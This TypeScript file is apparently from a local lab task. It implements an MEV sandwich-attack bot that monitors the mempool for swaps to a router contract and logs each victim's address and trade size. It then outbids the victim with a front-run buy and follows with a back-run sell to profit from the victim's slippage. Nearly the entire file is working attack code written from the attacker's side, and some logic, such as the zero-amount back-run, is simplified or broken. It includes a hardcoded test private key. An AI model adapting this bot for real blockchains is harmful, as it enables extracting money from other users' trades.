import { WebSocketProvider, Wallet, Interface, formatEther, parseEther } from 'ethers';

// ABI for parsing target transaction. Must match SimpleRouter's function signature
const RouterABI = [
  "function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)"
];

const RPC_URL = process.env.RPC_URL || 'ws://127.0.0.1:8546';

// Default Hardhat account #1 (Index 1) as the attacker
const ATTACKER_PRIVATE_KEY = process.env.PRIVATE_KEY || '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d';

// Our locally deployed SimpleRouter contract from Task 1
const TARGET_CONTRACT = process.env.TARGET_CONTRACT || '0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512'; 

async function startBot() {
    const provider = new WebSocketProvider(RPC_URL);
    const attackerWallet = new Wallet(ATTACKER_PRIVATE_KEY, provider);
    const iface = new Interface(RouterABI);

    console.log('=============================================');
    console.log('🥪 MEV Sandwich Bot Started');
    console.log('Attacker Address:', attackerWallet.address);
    console.log('Listening to Mempool on:', RPC_URL);
    console.log('Targeting Router:', TARGET_CONTRACT);
    console.log('=============================================\n');

    provider.on('pending', async (txHash: string) => {
        try {
            const tx = await provider.getTransaction(txHash);
            
            // Check if the transaction is targeting our router contract
            if (tx && tx.to && tx.to.toLowerCase() === TARGET_CONTRACT.toLowerCase()) {
                
                // Try to decode the transaction data
                const decodedData = iface.parseTransaction({ data: tx.data, value: tx.value });
                
                if (decodedData?.name === 'swapExactTokensForTokens') {
                    console.log(`\n🎯 Target Swap Detected in Mempool! TX Hash: ${txHash}`);
                    const amountIn = decodedData.args[0];
                    const amountOutMin = decodedData.args[1];
                    const path = decodedData.args[2];
                    
                    console.log(`Victim Address: ${tx.from}`);
                    console.log(`Victim Amount In: ${formatEther(amountIn)} Tokens`);
                    console.log(`Victim Slippage (Min Out): ${formatEther(amountOutMin)} Tokens`);

                    // 1. Calculate Priority Fees to control transaction ordering
                    // The victim's priority fee
                    const victimMaxPriorityFee = tx.maxPriorityFeePerGas || parseEther('1');
                    const victimMaxFeePerGas = tx.maxFeePerGas || parseEther('2');

                    // To front-run, we need to bid slightly higher than the victim
                    const frontRunPriorityFee = victimMaxPriorityFee + 100n; // Add 100 wei to outbid
                    
                    // To back-run, we bid exactly the base fee (0 priority fee) or very low 
                    // so it lands immediately after the victim block
                    const backRunPriorityFee = 0n;

                    let botNonce = await provider.getTransactionCount(attackerWallet.address);

                    // 2. Build the Front-run Transaction
                    // We buy the exact same token the victim is buying, just before them
                    console.log('\n🚀 Step 1: Broadcasting Front-run transaction...');
                    const frontRunTx = await attackerWallet.sendTransaction({
                        to: TARGET_CONTRACT,
                        data: iface.encodeFunctionData('swapExactTokensForTokens', [
                            amountIn / 2n, // Attacker trade size (half of victim's trade)
                            0, // Accept any output for the front-run
                            path, // Same token path to pump the price
                            attackerWallet.address,
                            Math.floor(Date.now() / 1000) + 60 * 10
                        ]),
                        maxPriorityFeePerGas: frontRunPriorityFee,
                        maxFeePerGas: victimMaxFeePerGas,
                        nonce: botNonce,
                        gasLimit: 300000
                    });
                    console.log(`✅ Front-run Sent: ${frontRunTx.hash}`);
                    
                    // Increment nonce for the second transaction
                    botNonce++;

                    // 3. Build the Back-run Transaction
                    // We sell the tokens we just bought to the victim at the inflated price
                    console.log('📉 Step 2: Broadcasting Back-run transaction...');
                    
                    // In a real scenario, the back-run path is reversed (e.g. B -> A instead of A -> B)
                    const reversePath = [path[1], path[0]];
                    
                    const backRunTx = await attackerWallet.sendTransaction({
                        to: TARGET_CONTRACT,
                        data: iface.encodeFunctionData('swapExactTokensForTokens', [
                            0n, // Sell everything bought (In reality this is dynamically calculated based on front-run success)
                            0n, 
                            reversePath, 
                            attackerWallet.address,
                            Math.floor(Date.now() / 1000) + 60 * 10
                        ]),
                        maxPriorityFeePerGas: backRunPriorityFee,
                        maxFeePerGas: victimMaxFeePerGas,
                        nonce: botNonce,
                        gasLimit: 300000
                    });
                    
                    console.log(`✅ Back-run Sent: ${backRunTx.hash}`);
                    console.log(`🥪 Sandwich Attack Completed! Waiting for block confirmation...`);
                }
            }
        } catch (error) {
            // Ignore any standard transactions we can't parse or non-targets
        }
    });
}

startBot().catch(console.error);